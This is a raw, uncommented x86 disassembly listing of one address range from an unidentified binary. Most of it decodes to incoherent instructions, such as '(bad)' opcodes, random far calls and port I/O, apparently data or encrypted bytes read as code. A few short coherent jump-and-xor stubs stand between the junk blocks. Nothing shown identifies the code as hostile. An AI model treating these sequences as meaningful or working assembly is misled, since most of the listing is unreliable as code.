  410625:	stos   DWORD PTR es:[edi],eax
  410626:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410627:	cs popf 
  410629:	(bad)  
  41062a:	mov    cl,0xb3
  41062c:	mov    BYTE PTR ds:0x8e665d15,ah
  410632:	add    eax,0x7a971a6b
  410637:	es stos BYTE PTR es:[edi],al
  410639:	repz adc ah,BYTE PTR [ecx+0x17]
  41063d:	bound  ecx,QWORD PTR [esi+0xa1e2b56]
  410643:	fdivr  DWORD PTR [eax-0x2be91433]
  410649:	ins    DWORD PTR es:[edi],dx
  41064a:	imul   DWORD PTR [ecx+0x14]
  41064d:	xchg   esi,eax
  41064e:	rcl    BYTE PTR [ecx],0xb4
  410651:	xor    eax,0x2300e39e
  410656:	xchg   dh,ah
  410658:	xor    cl,BYTE PTR ds:0x4f4cdd4
  41065e:	out    0x56,eax
  410660:	sub    esi,0xffffffd7
  410663:	loope  0x4106c3
  410665:	(bad)  
  410666:	mov    esp,0x676a9a56
  41066b:	ret    
  41066c:	dec    esp
  41066d:	sbb    edx,edi
  41066f:	popa   
  410670:	sbb    ch,cl
  410672:	xor    eax,DWORD PTR [eax]
  410674:	call   0x92fb:0x8a30b661
  41067b:	and    esi,0x1c
  41067e:	xchg   ebx,eax
  41067f:	(bad)  
  410680:	and    bh,BYTE PTR [eax+0x3aeac674]
  410686:	loopne 0x4106a9
  410688:	xchg   ebx,eax
  410689:	add    edi,ebp
  41068b:	stos   DWORD PTR es:[edi],eax
  41068c:	pop    ebp
  41068d:	leave  
  41068e:	ins    DWORD PTR es:[edi],dx
  41068f:	xchg   BYTE PTR [eax+0xc],dl
  410692:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410693:	jns    0x41067c
  410695:	xchg   esi,eax
  410696:	push   edi
  410697:	mov    ebp,0xf0d7f744
  41069c:	outs   dx,BYTE PTR ds:[esi]
  41069d:	or     eax,0x7133b899
  4106a2:	std    
  4106a3:	fs enter 0x37d2,0x40
  4106a8:	push   eax
  4106a9:	(bad)  
  4106aa:	fnstcw WORD PTR [edi+0x42]
  4106ad:	xchg   ecx,eax
  4106ae:	dec    esp
  4106af:	aam    0x89
  4106b1:	jae    0x410674
  4106b3:	enter  0x345e,0xc9
  4106b7:	lds    ecx,FWORD PTR [ecx+0x50815e58]
  4106bd:	repz sbb eax,DWORD PTR ds:0x1723600e
  4106c5:	and    eax,0xc580e5a
  4106ca:	mov    es,WORD PTR [eax-0x75db8fe0]
  4106d0:	mov    ebp,0x8a4818d
  4106d5:	jp     0x410710
  4106d7:	inc    edx
  4106d8:	sbb    BYTE PTR [eax-0x76],bl
  4106db:	sbb    DWORD PTR [eax-0x49],esi
  4106de:	push   0xc4a94f98
  4106e3:	inc    esi
  4106e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106e5:	push   esi
  4106e6:	push   ebx
  4106e7:	cld    
  4106e8:	mov    eax,0xa1ad02f7
  4106ed:	ret    0x71ca
  4106f0:	ja     0x4106ac
  4106f2:	inc    edx
  4106f3:	hlt    
  4106f4:	cmp    ecx,DWORD PTR [edi]
  4106f6:	stos   BYTE PTR es:[edi],al
  4106f7:	jno    0x4106b9
  4106f9:	inc    esp
  4106fa:	cwde   
  4106fb:	(bad)
  4106ff:	sub    ebx,esi
  410701:	dec    ecx
  410702:	sar    DWORD PTR [esi+0x6e599d94],1
  410708:	sar    esp,cl
  41070a:	xor    DWORD PTR [ecx-0xd],0x65
  41070e:	iret   
  41070f:	div    DWORD PTR [ebp-0x78]
  410712:	int3   
  410713:	sbb    dh,BYTE PTR [edi+0x1]
  410716:	inc    ecx
  410717:	daa    
  410718:	jmp    0x41074b
  41071a:	sti    
  41071b:	ffreep st(6)
  41071d:	jb     0x4106a5
  41071f:	clc    
  410720:	pop    edi
  410721:	jmp    0x5bd6:0x324eb36
  410728:	aaa    
  410729:	iret   
  41072a:	pop    eax
  41072b:	in     al,dx
  41072c:	push   0xac7bb1ee
  410731:	mov    al,ds:0xa848922b
  410736:	sub    bh,cl
  410738:	popf   
  410739:	pop    edi
  41073a:	adc    edi,ecx
  41073c:	(bad)
  410740:	push   ds
  410741:	clc    
  410742:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410743:	scas   al,BYTE PTR es:[edi]
  410744:	mov    ebx,0xc2170fb0
  410749:	mov    dh,0x5d
  41074b:	pop    esi
  41074c:	pop    edx
  41074d:	popf   
  41074e:	in     al,0x97
  410750:	clc    
  410751:	add    al,0x70
  410753:	xor    esp,DWORD PTR [ebx+0x4bd1152d]
  410759:	xchg   DWORD PTR [eax+edx*1+0x22a7a407],ecx
  410760:	retf   0xbcf1
  410763:	xchg   edi,eax
  410764:	adc    ebx,DWORD PTR [edx+ebx*1]
  410767:	in     eax,0xf2
  410769:	das    
  41076a:	push   cs
  41076b:	and    esi,DWORD PTR ds:0x26285194
  410771:	cmp    DWORD PTR [ecx],0x998b5684
  410777:	inc    edx
  410778:	ins    DWORD PTR es:[edi],dx
  410779:	xchg   DWORD PTR [edx],esi
  41077b:	scas   eax,DWORD PTR es:[edi]
  41077c:	data16 cmc 
  41077e:	xchg   ebp,eax
  41077f:	mov    bl,0xc7
  410781:	push   ss
  410782:	in     al,dx
  410783:	cli    
  410784:	xchg   ebp,eax
  410785:	test   dl,0xec
  410788:	pop    ss
  410789:	add    eax,0x815c4b4f
  41078e:	lock push cs
  410790:	pop    esi
  410791:	in     eax,dx
  410792:	(bad)  
  410793:	fidivr DWORD PTR [esi-0x2e]
  410796:	or     al,0xb6
  410798:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410799:	rol    BYTE PTR [ebx-0x1f],cl
  41079c:	call   0x447c:0x235c55bd
  4107a3:	cli    
  4107a4:	sub    cl,BYTE PTR [edi]
  4107a6:	jle    0x41074d
  4107a8:	adc    eax,0x57b5cbcf
  4107ad:	or     al,0x7b
  4107af:	imul   ecx,DWORD PTR [edi+0x4a58f693],0x40
  4107b6:	call   FWORD PTR [esp+ebx*1]
  4107b9:	addr16 mov cl,0xe3
  4107bc:	cld    
  4107bd:	dec    ebp
  4107be:	mov    eax,0xd88d646e
  4107c3:	cmp    edi,DWORD PTR [edi-0x22]
  4107c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107c7:	push   ds
  4107c8:	and    ebx,esi
  4107ca:	add    BYTE PTR [esi+0x19dd09d5],ch
  4107d0:	les    edx,FWORD PTR [ebx-0x46]
  4107d3:	jmp    0x7e22bb85
  4107d8:	dec    ecx
  4107d9:	es and al,0xb4
  4107dc:	xor    eax,0x8c78eca1
  4107e1:	call   0xbf27e476
  4107e6:	jb     0x41076a
  4107e8:	xor    DWORD PTR [ecx+0x34],ebp
  4107eb:	fisttp DWORD PTR [edx]
  4107ed:	popf   
  4107ee:	shl    DWORD PTR [edi],1
  4107f0:	cmp    al,0x66
  4107f2:	or     eax,0x3fbca40c
  4107f7:	or     al,BYTE PTR [ecx]
  4107f9:	or     al,0x2b
  4107fb:	fistp  QWORD PTR [ebx]
  4107fd:	fucompp 
  4107ff:	add    DWORD PTR [edx],0x0
  410802:	add    dh,cl
  410804:	ror    ebx,0xc8
  410807:	fcmovnbe st,st(6)
  410809:	fld    st(1)
  41080b:	ud0    edi,esp
  41080e:	pop    ds
  41080f:	imul   edx,DWORD PTR [edi+0x25],0x7851a64d
  410816:	js     0x4107fd
  410818:	jle    0x410892
  41081a:	js     0x41088f
  41081c:	(bad)  
  41081d:	cmp    DWORD PTR [ecx-0x6b5903cd],esp
  410823:	jge    0x410864
  410825:	mov    esi,0xdf3fb859
  41082a:	frndint 
  41082c:	cmc    
  41082d:	push   edx
  41082e:	je     0x41083e
  410830:	and    eax,0x6bbb1c1b
  410835:	lds    esi,FWORD PTR [eax-0x77]
  410838:	jbe    0x41089d
  41083a:	in     al,dx
  41083b:	push   eax
  41083c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41083d:	rcr    BYTE PTR [ecx],1
  41083f:	adc    eax,0xe2044799
  410844:	dec    edx
  410845:	inc    ebx
  410846:	ror    BYTE PTR [eax],cl
  410848:	jp     0x4107e3
  41084a:	push   esi
  41084b:	push   eax
  41084c:	inc    edi
  41084d:	cmc    
  41084e:	aad    0x4f
  410850:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410851:	rcl    cl,0xb9
  410854:	pop    ecx
  410855:	stos   DWORD PTR es:[edi],eax
  410856:	dec    esi
  410857:	pop    ecx
  410858:	adc    eax,ebx
  41085a:	pushf  
  41085b:	push   esp
  41085c:	push   es
  41085d:	mov    DWORD PTR [ebp-0x41],esp
  410860:	sbb    esp,edx
  410862:	cli    
  410863:	repz push edx
  410865:	js     0x4108c0
  410867:	iret   
  410868:	adc    DWORD PTR [edx-0x79a87a82],esp
  41086e:	arpl   bx,cx
  410870:	outs   dx,DWORD PTR ds:[esi]
  410871:	or     DWORD PTR ds:0x3848729,esi
  410877:	sub    DWORD PTR [esi],esi
  410879:	(bad)  
  41087a:	icebp  
  41087b:	fisttp WORD PTR [ebx]
  41087d:	cwde   
  41087e:	jne    0x41084a
  410880:	mov    ds:0x6638ae7b,eax
  410885:	xlat   BYTE PTR ds:[ebx]
  410886:	scas   al,BYTE PTR es:[edi]
  410887:	add    al,0x8d
  410889:	pop    ds
  41088a:	clc    
  41088b:	iret   
  41088c:	fcomp  DWORD PTR [edi+0x5e]
  41088f:	push   edx
  410890:	mov    edx,0x3511ba0b
  410895:	in     eax,dx
  410896:	fs out 0xd0,eax
  410899:	mov    ah,0xde
  41089b:	dec    ecx
  41089c:	lods   eax,DWORD PTR ds:[esi]
  41089d:	adc    DWORD PTR [ecx-0x60836cd6],eax
  4108a3:	pop    esi
  4108a4:	loop   0x410861
  4108a6:	in     al,0x13
  4108a8:	adc    eax,DWORD PTR [edi+0x6bc856a8]
  4108ae:	jbe    0x41088d
  4108b0:	inc    ecx
  4108b1:	jmp    0x17df:0xfc245078
  4108b8:	xchg   eax,ebx
  4108ba:	mov    eax,DWORD PTR [edi+0x2c]
  4108bd:	test   BYTE PTR [ebx],cl
  4108bf:	ror    BYTE PTR [edi],cl
  4108c1:	loopne 0x4108de
  4108c3:	ja     0x410914
  4108c5:	cmp    al,BYTE PTR [edi]
  4108c7:	pop    DWORD PTR [edx+0x79]
  4108ca:	je     0x410870
  4108cc:	inc    ebx
  4108cd:	call   0x1c40fa3c
  4108d2:	xchg   edx,eax
  4108d3:	cwde   
  4108d4:	sbb    al,0x35
  4108d6:	lods   eax,DWORD PTR ds:[esi]
  4108d7:	and    eax,0xa4dd86e0
  4108dc:	mov    bh,dh
  4108de:	(bad)  
  4108df:	jg     0x41089c
  4108e1:	and    ah,BYTE PTR [edx+0x3065dab5]
  4108e7:	mov    BYTE PTR [edx+0x7677e62d],0x8f
  4108ee:	out    dx,al
  4108ef:	add    BYTE PTR [ecx],dh
  4108f1:	inc    ebx
  4108f2:	adc    BYTE PTR [ebp+0x35be93f5],al
  4108f8:	inc    ecx
  4108f9:	dec    esp
  4108fa:	imul   ecx,esi,0x85298174
  410900:	mov    ebp,0x60ffd0ab
  410905:	jb     0x4108a8
  410907:	xor    al,0x85
  410909:	mov    eax,0x405f7156
  41090e:	loope  0x410967
  410910:	imul   ebx,DWORD PTR [eax+edi*4],0xfd05bd00
  410917:	leave  
  410918:	xchg   edi,eax
  410919:	fcmovu st,st(1)
  41091b:	mov    esi,0xaed80622
  410920:	add    edi,0xb10b53b7
  410926:	mov    edx,0xacc1eb8a
  41092b:	fdiv   QWORD PTR [edx]
  41092d:	xor    eax,0x2b72da68
  410932:	arpl   WORD PTR [ecx+0x45664f08],si
  410938:	scas   al,BYTE PTR es:[edi]
  410939:	fadd   QWORD PTR [esi*1-0x6116d421]
  410940:	adc    eax,0x20a57471
  410945:	out    dx,al
  410946:	mov    esp,edx
  410948:	pop    edi
  410949:	jecxz  0x410986
  41094b:	sub    edi,DWORD PTR [eax+0x632b2d38]
  410951:	jae    0x4108d7
  410953:	xchg   BYTE PTR [esi+0x2f],dl
  410956:	adc    ah,BYTE PTR [ebp-0x3e]
  410959:	imul   esp,DWORD PTR [ebp-0x2fddf261],0x376152a5
  410963:	sahf   
  410964:	pop    esp
  410965:	stc    
  410966:	test   al,ah
  410968:	rcr    BYTE PTR [edx+0x45],cl
  41096b:	fwait
  41096c:	lods   al,BYTE PTR ds:[esi]
  41096d:	sub    cl,BYTE PTR [edi+0x37]
  410970:	jo     0x41094e
  410972:	addr16 sbb al,0x39
  410975:	aad    0xb7
  410977:	sbb    edi,DWORD PTR [ebp-0x57ee1796]
  41097d:	mov    bh,0x94
  41097f:	or     DWORD PTR [edi],esi
  410981:	mov    ebp,0x6c918c09
  410986:	mov    WORD PTR [ebp+eax*4-0x42],?
  41098a:	pushf  
  41098b:	inc    eax
  41098c:	pushf  
  41098d:	mov    ch,0x14
  41098f:	frstor [edi-0x5859cc86]
  410995:	icebp  
  410996:	jg     0x410933
  410998:	inc    esp
  410999:	aas    
  41099a:	jge    0x410921
  41099c:	shl    BYTE PTR [ebx+0x7259fc01],0x88
  4109a3:	cld    
  4109a4:	jmp    0x724fecaa
  4109a9:	sub    ebx,ecx
  4109ab:	or     esi,ecx
  4109ad:	and    BYTE PTR [esi],0xf8
  4109b0:	xchg   esp,eax
  4109b1:	js     0x410989
  4109b3:	xchg   ebp,eax
  4109b4:	inc    eax
  4109b5:	sbb    dh,BYTE PTR [edx]
  4109b7:	xor    ebx,DWORD PTR [ecx+edx*4]
  4109ba:	xchg   ebx,eax
  4109bb:	scas   al,BYTE PTR es:[edi]
  4109bc:	sub    eax,0xa8fec306
  4109c1:	sbb    edi,ecx
  4109c3:	ret    0x5da6
  4109c6:	scas   eax,DWORD PTR es:[edi]
  4109c7:	(bad)  
  4109c9:	mov    ch,0x53
  4109cb:	or     bh,BYTE PTR [esi+ecx*1]
  4109ce:	dec    edi
  4109cf:	and    BYTE PTR [esp+edi*2+0x2f],dl
  4109d3:	jmp    0x8a12:0x97b77d9
  4109da:	popf   
  4109db:	jge    0x410a0a
  4109dd:	popa   
  4109de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4109df:	jmp    0x410967
  4109e1:	out    dx,eax
  4109e2:	inc    esp
  4109e3:	xor    eax,0xde0e5fb9
  4109e8:	mov    bh,0x68
  4109ea:	inc    esp
  4109eb:	pop    ebp
  4109ec:	mov    WORD PTR [edx],es
  4109ee:	pop    ebp
  4109ef:	imul   ecx,DWORD PTR [ecx-0x362ce2cc],0x5e
  4109f6:	xchg   edi,eax
  4109f7:	imul   esp,DWORD PTR [ecx+0xea39766],0xb
  4109fe:	out    0xf6,eax
  410a00:	pushf  
  410a01:	xor    BYTE PTR [edi-0x3fa09335],0x41
  410a08:	outs   dx,BYTE PTR ds:[esi]
  410a09:	ror    DWORD PTR [edx-0x16950df3],1
  410a0f:	jno    0x4109db
  410a11:	dec    eax
  410a12:	mov    edi,0x69a0bfdd
  410a17:	fisubr WORD PTR [esi]
  410a19:	loop   0x4109b7
  410a1b:	jle    0x4109fa
  410a1d:	mov    ecx,0xdda5ed22
  410a22:	sub    edi,DWORD PTR [edi-0x40]
  410a25:	push   edx
  410a26:	dec    eax
  410a27:	xor    bh,BYTE PTR [edx]
  410a29:	inc    eax
  410a2a:	cmc    
  410a2b:	popf   
  410a2c:	cmp    DWORD PTR [esp+edx*4],0x1c671093
  410a33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a34:	and    edx,DWORD PTR [edx]
  410a36:	jecxz  0x410a2c
  410a38:	mov    al,0x5f
  410a3a:	pop    esp
  410a3b:	mov    eax,ds:0x8094f0a7
  410a40:	mov    edx,esi
  410a42:	cmp    eax,0xccdebd90
  410a47:	add    DWORD PTR [esi*8+0x4ddca901],ecx
  410a4e:	mov    ebp,0x9c2d68e6
  410a53:	mov    dl,0x41
  410a55:	add    ebx,DWORD PTR [edi]
  410a57:	push   cs
  410a58:	loop   0x410ac4
  410a5a:	fwait
  410a5b:	push   ebp
  410a5c:	ss test al,0xc2
  410a5f:	xor    al,0xd8
  410a61:	cdq    
  410a62:	int3   
  410a63:	pop    esi
  410a64:	fcomp  DWORD PTR [edx]
  410a66:	ja     0x4109fe
  410a68:	push   0x3f
  410a6a:	nop
  410a6b:	mov    cl,0x6e
  410a6d:	pop    edx
  410a6e:	dec    ebp
  410a6f:	adc    BYTE PTR [edi-0x2c],0xd3
  410a73:	fwait
  410a74:	call   0xb785:0x9722aa58
  410a7b:	sub    DWORD PTR [esi+0x7c4f37fe],edi
  410a81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a82:	mov    DWORD PTR [ebx],ecx
  410a84:	in     eax,dx
  410a85:	aas    
  410a86:	ja     0x410a94
  410a8c:	mov    edx,DWORD PTR [ebp-0x28]
  410a8f:	jmp    0x411f76
  410a94:	mov    edx,DWORD PTR [ebp-0x30]
  410a97:	mov    edi,DWORD PTR [ebp-0x4]
  410a9a:	xor    edx,eax
  410a9c:	xor    edi,eax
  410a9e:	jmp    0x410d26
  410aa3:	aas    
  410aa4:	retf   
  410aa5:	iret   
  410aa6:	(bad)
  410aa9:	aad    0xc9
  410aab:	jo     0x410a57
  410aad:	lods   eax,DWORD PTR ds:[esi]
  410aae:	test   DWORD PTR [ecx],0x13f37feb
  410ab4:	push   esi
  410ab5:	js     0x410b2f
  410ab7:	in     eax,0x7e
  410ab9:	js     0x410b33
  410abb:	test   BYTE PTR [esi],dh
  410abd:	xor    eax,0x7c45b647
  410ac2:	fucomip st,st(6)
  410ac4:	(bad)  
  410ac5:	inc    eax
  410ac6:	test   cl,bh
  410ac8:	xchg   ebx,eax
  410ac9:	inc    BYTE PTR [esi-0x4]
  410acc:	xor    al,0x72
  410ace:	ins    BYTE PTR es:[edi],dx
  410acf:	dec    esi
  410ad0:	ins    BYTE PTR es:[edi],dx
  410ad1:	jb     0x410a5c
  410ad3:	(bad)  
  410ad4:	push   edx
  410ad5:	mov    ebx,0x63c37377
  410ada:	push   edx
  410adb:	out    0x6c,eax
  410add:	cmp    eax,0xa63643b3
  410ae2:	inc    eax
  410ae3:	fs enter 0x4445,0x14
  410ae8:	push   esi
  410ae9:	add    dh,bl
  410aeb:	sub    BYTE PTR [ebp-0x63],0x48
  410aef:	mov    ds:0x998f7cda,eax
  410af4:	loopne 0x410a88
  410af6:	mov    ds:0x2ecbc53a,al
  410afb:	xchg   esp,eax
  410afc:	pusha  
  410afd:	icebp  
  410afe:	fs call 0xb84b792d
  410b04:	fdivr  st,st(7)
  410b06:	push   ebp
  410b07:	aam    0x7c
  410b09:	pop    eax
  410b0a:	cld    
  410b0b:	add    eax,0xeee3c4b3
  410b10:	hlt    
  410b11:	add    ebx,ebx
  410b13:	in     al,0xa2
  410b15:	jb     0x410b68
  410b17:	mov    ah,0x9f
  410b19:	cmc    
  410b1a:	ret    
  410b1b:	jecxz  0x410ae3
  410b1d:	mov    ds:0x3df69688,eax
  410b22:	xchg   edi,eax
  410b23:	pushf  
  410b24:	inc    edi
  410b25:	cmp    dh,al
  410b27:	or     ch,BYTE PTR [ebx]
  410b29:	jae    0x410aeb
  410b2b:	popa   
  410b2c:	xor    eax,0xe907f2b1
  410b31:	fmul   DWORD PTR es:[edi+0x3a]
  410b35:	or     dl,bl
  410b37:	cmc    
  410b38:	cmp    al,0xef
  410b3a:	retf   0xec11
  410b3d:	and    dh,bh
  410b3f:	sbb    esp,DWORD PTR [esi+0x4e]
  410b42:	fisub  DWORD PTR [ecx-0x5f15141b]
  410b48:	mov    eax,0xffada0b8
  410b4d:	cdq    
  410b4e:	pushf  
  410b4f:	adc    edi,DWORD PTR [eax+0x2572518e]
  410b55:	sbb    ah,BYTE PTR [eax-0x26]
  410b58:	xchg   BYTE PTR [esi],bl
  410b5a:	add    cl,cl
  410b5c:	sub    edi,edi
  410b5e:	std    
  410b5f:	aam    0x97
  410b61:	leave  
  410b62:	out    dx,al
  410b63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b64:	xchg   esp,eax
  410b65:	es das 
  410b67:	aad    0xbe
  410b69:	pop    ecx
  410b6a:	out    0xcf,al
  410b6c:	mov    esi,0xb7d6a7ae
  410b71:	mov    ebx,0xbb04dcd4
  410b76:	push   ss
  410b77:	aaa    
  410b78:	inc    edx
  410b79:	and    esp,DWORD PTR [ebx+0x7cd7edb9]
  410b7f:	aaa    
  410b80:	js     0x410b0b
  410b82:	dec    esi
  410b83:	xor    edi,DWORD PTR [ecx]
  410b85:	push   es
  410b86:	retf   0x7e47
  410b89:	out    0x18,al
  410b8b:	repz fdiv QWORD PTR [eax]
  410b8e:	add    ah,BYTE PTR [edx]
  410b90:	xchg   BYTE PTR [ebx-0x14],bl
  410b93:	pop    esp
  410b94:	repz adc ch,BYTE PTR [ebp-0x28]
  410b98:	xchg   ebp,eax
  410b99:	aas    
  410b9a:	mov    al,ds:0xf0f6884
  410b9f:	adc    edi,eax
  410ba1:	lahf   
  410ba2:	call   0xcf18c3e9
  410ba7:	dec    edx
  410ba8:	in     al,0x47
  410baa:	call   0xc33b:0x4105e8d1
  410bb1:	int    0x38
  410bb3:	icebp  
  410bb4:	(bad)  
  410bb5:	lods   eax,DWORD PTR ds:[esi]
  410bb6:	add    ebx,ebp
  410bb8:	and    bh,BYTE PTR [esi+0x75919e]
  410bbe:	sub    eax,edi
  410bc0:	cmp    ebx,edi
  410bc2:	jecxz  0x410c10
  410bc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bc5:	mov    ax,0xca8f
  410bc9:	xchg   DWORD PTR [edi],ebp
  410bcb:	sbb    bl,BYTE PTR [ebp-0x342f8672]
  410bd1:	sbb    DWORD PTR [eax+ecx*4+0x67],ebx
  410bd5:	mov    ecx,0x958ec759
  410bda:	test   DWORD PTR [ebx+0x4],esi
  410bdd:	xor    BYTE PTR [esi-0x63a8d123],bl
  410be3:	daa    
  410be4:	mov    dh,0xc8
  410be6:	daa    
  410be7:	ins    DWORD PTR es:[edi],dx
  410be8:	or     ch,cl
  410bea:	push   edx
  410beb:	mov    ds:0xfc871aba,eax
  410bf0:	inc    esi
  410bf1:	dec    esp
  410bf2:	dec    ebp
  410bf3:	jo     0x410bfa
  410bf5:	sub    BYTE PTR [ecx+ebx*2-0x7ef20a95],cl
  410bfc:	loopne 0x410c0d
  410bfe:	neg    DWORD PTR [edx+0x2c4b873a]
  410c04:	aad    0x88
  410c06:	shl    ch,cl
  410c08:	xchg   esi,eax
  410c09:	fild   WORD PTR [edx]
  410c0b:	dec    ebp
  410c0c:	push   ebx
  410c0d:	mov    ebp,0xa8d0ff4e
  410c12:	jmp    0x5748a7b2
  410c17:	push   ss
  410c18:	jecxz  0x410c22
  410c1a:	shl    DWORD PTR [ebp+0x1b],1
  410c1d:	pop    ss
  410c1e:	jae    0x410bf4
  410c20:	inc    ecx
  410c21:	cld    
  410c22:	jp     0x410c52
  410c24:	mov    cs,WORD PTR [ecx-0x1a3f7da1]
  410c2a:	jmp    0x410bc4
  410c2c:	mov    ds:0x88635215,eax
  410c31:	jl     0x410c08
  410c33:	(bad)  
  410c34:	cmp    DWORD PTR [esi+ecx*8-0xaf42747],ebx
  410c3b:	and    al,0x39
  410c3d:	in     eax,dx
  410c3e:	xlat   BYTE PTR ds:[ebx]
  410c3f:	(bad)  
  410c40:	fmul   DWORD PTR [edi+ecx*2+0x4c]
  410c44:	push   eax
  410c45:	push   ecx
  410c46:	in     eax,0x88
  410c48:	xor    eax,0xca4ce157
  410c4d:	mov    eax,0xa99cd2ed
  410c52:	leave  
  410c53:	jmp    0x410cc5
  410c55:	popa   
  410c56:	dec    edi
  410c57:	or     BYTE PTR [eax-0x7bec8a66],0x59
  410c5e:	inc    ebp
  410c5f:	jmp    0x410c04
  410c61:	dec    ebp
  410c62:	and    DWORD PTR [ecx+ebx*2+0x1b53c19],0xcbbe535
  410c6d:	ins    BYTE PTR es:[edi],dx
  410c6e:	sbb    DWORD PTR [edi],ebp
  410c70:	pusha  
  410c71:	mul    BYTE PTR [edx+0x58]
  410c74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c75:	dec    ebx
  410c76:	ins    BYTE PTR es:[edi],dx
  410c77:	sbb    ecx,DWORD PTR [esp+edi*1+0x59]
  410c7b:	rcr    ch,cl
  410c7d:	mov    eax,0x412bf1e9
  410c82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c83:	jno    0x410ccc
  410c85:	call   0x9a58fbaf
  410c8a:	(bad)  
  410c8b:	test   DWORD PTR [ebp-0x43],ebp
  410c8e:	inc    ebx
  410c8f:	sbb    ecx,esp
  410c91:	test   eax,0xbe7ba8cf
  410c96:	scas   al,BYTE PTR es:[edi]
  410c97:	add    ah,bl
  410c99:	jmp    0x7cd6:0x91d7e0c9
  410ca0:	popf   
  410ca1:	pop    ebp
  410ca2:	mov    edi,0xbc61cf6f
  410ca7:	bound  esp,QWORD PTR [eax]
  410ca9:	mov    bl,0x91
  410cab:	pop    ebp
  410cac:	jge    0x410cfb
  410cae:	out    dx,eax
  410caf:	fdiv   QWORD PTR [esp+eiz*4]
  410cb2:	int    0x75
  410cb4:	xchg   ecx,eax
  410cb5:	inc    ebx
  410cb6:	mov    eax,eax
  410cb8:	inc    BYTE PTR [ebx+0xd868bee]
  410cbe:	ret    
  410cbf:	push   esi
  410cc0:	shr    BYTE PTR [eax],cl
  410cc2:	(bad)  
  410cc3:	mov    eax,0x215b4fed
  410cc8:	xor    edi,DWORD PTR [ecx+0x5dd90634]
  410cce:	icebp  
  410ccf:	sahf   
  410cd0:	pushf  
  410cd1:	sub    al,0x44
  410cd3:	pop    esp
  410cd4:	jecxz  0x410cf9
  410cd6:	inc    edi
  410cd7:	ins    BYTE PTR es:[edi],dx
  410cd8:	stos   BYTE PTR es:[edi],al
  410cd9:	jnp    0x410c77
  410cdb:	or     ah,BYTE PTR [edx]
  410cdd:	push   0x7200f574
  410ce2:	aad    0xe5
  410ce4:	stos   DWORD PTR es:[edi],eax
  410ce5:	rcl    DWORD PTR [esi+eiz*2],1
  410ce8:	cmp    BYTE PTR [ecx-0x23],ch
  410ceb:	leave  
  410cec:	in     eax,dx
  410ced:	or     BYTE PTR ds:0x525ccfdd,bl
  410cf3:	jg     0x410cbc
  410cf5:	mov    al,0x5d
  410cf7:	mov    bl,0x9
  410cf9:	jo     0x410d73
  410cfb:	jno    0x410d10
  410cfd:	xlat   BYTE PTR ds:[ebx]
  410cfe:	pop    esp
  410cff:	cmp    al,0xaf
  410d01:	xor    al,0x78
  410d03:	inc    edx
  410d04:	cli    
  410d05:	xchg   ebp,eax
  410d06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d07:	cwde   
  410d08:	sbb    DWORD PTR [ecx+0x13],0x41011da2
  410d0f:	push   ds
  410d10:	adc    eax,0x8bf49bf
  410d15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d16:	mov    DWORD PTR [eax+esi*2-0x2c],ebp
  410d1a:	in     eax,dx
  410d1b:	lock gs jns 0x410d18
  410d1f:	std    
  410d20:	push   edi
  410d21:	lds    esp,FWORD PTR [ecx-0x61]
  410d24:	and    edx,esi
  410d26:	add    edi,ecx
  410d28:	add    edx,ecx
  410d2a:	imul   edx,edi
  410d2d:	mov    edi,DWORD PTR [ebp-0x8]
  410d30:	mov    ebx,DWORD PTR [ebp-0x10]
  410d33:	sub    ebx,edi
  410d35:	cmp    ebx,edx
  410d37:	ja     0x410d45
  410d3d:	mov    edx,DWORD PTR [ebp-0x2c]
  410d40:	jmp    0x411f76
  410d45:	mov    edx,DWORD PTR [ebp-0x34]
  410d48:	mov    edi,DWORD PTR [ebp-0x4]
  410d4b:	xor    edx,eax
  410d4d:	xor    edi,eax
  410d4f:	jmp    0x410fd7
  410d54:	lds    edi,FWORD PTR [edx+edx*8]
  410d57:	ds fxch st(6)
  410d5a:	fxch   st(3)
  410d5c:	adc    ecx,edx
  410d5e:	add    dh,BYTE PTR [edi]
  410d60:	fmul   st(1),st
  410d62:	mov    esi,0x7854f84a
  410d67:	js     0x410d4e
  410d69:	jle    0x410de3
  410d6b:	js     0x410cfb
  410d6d:	mov    edx,0xcda7c4bf
  410d72:	cmp    bh,BYTE PTR [ebp-0x55]
  410d75:	and    DWORD PTR [ebp-0x46486805],ecx
  410d7b:	dec    edx
  410d7c:	int3   
  410d7d:	repnz pop edx
  410d7f:	mov    bh,0xbd
  410d81:	mov    ecx,0x650dc0c1
  410d86:	xchg   DWORD PTR [edx],esp
  410d88:	test   eax,0xf9c3084
  410d8d:	repnz iret 
  410d8f:	jb     0x410d74
  410d91:	(bad)  
  410d92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d94:	adc    ebp,ebp
  410d96:	and    al,0xad
  410d98:	cmc    
  410d99:	sub    al,0x5e
  410d9b:	mov    cl,0x39
  410d9d:	mov    ds:0x689f8c77,al
  410da2:	popf   
  410da3:	cmp    BYTE PTR [eax+esi*1],0x8
  410da7:	(bad)  
  410da8:	push   edi
  410da9:	rol    DWORD PTR [edx-0x29],1
  410dac:	test   DWORD PTR [edi],ebp
  410dae:	xchg   edx,eax
  410daf:	sub    DWORD PTR [ebp-0xf5f2987],0xd34b757e
  410db9:	ja     0x410deb
  410dbb:	in     eax,0xdc
  410dbd:	jmp    0x410d7e
  410dbf:	lds    edi,FWORD PTR [eax+0x42]
  410dc2:	xchg   DWORD PTR [eax],edi
  410dc4:	(bad)  
  410dc5:	cld    
  410dc6:	push   ecx
  410dc7:	lahf   
